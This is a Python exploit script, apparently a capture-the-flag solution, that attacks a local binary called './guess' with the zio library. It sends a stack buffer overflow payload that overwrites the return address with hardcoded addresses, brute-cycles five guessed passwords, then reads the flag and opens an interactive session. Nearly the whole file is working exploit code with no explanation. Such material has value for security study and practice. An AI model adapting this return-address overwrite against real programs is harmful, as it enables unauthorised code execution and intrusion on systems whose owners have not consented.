from zio import *
import struct

target = "./guess"

def get_io(target):
	io = zio(target, timeout = 9999)
	return io

def try_guess(io, data):
	io.write(data + "\n")
	return io.read_until("!")
pass_str = ["linux", "batman", "peanuts", "pikachu", "superman"]
def pwn(io):

	ret_addr = 0x08048830
	ret_addr_str = struct.pack("I", ret_addr)
	flag_addr_str = struct.pack("I", 0x0804A100)

	data = 'x' * (0x8c + 4 * 4) + ret_addr_str + 'x' * 4 + flag_addr_str
	try_guess(io, data)

	times = 0
	while True:
		data = try_guess(io, pass_str[times])
		#print "data is:", data
		if data.find("Bad") == -1:
			times += 1
			if times == 5:
				break
	raw_input(":")
	io.read_until(":")
	io.write("./flag\n")
	io.interact()

io = get_io(target)
pwn(io)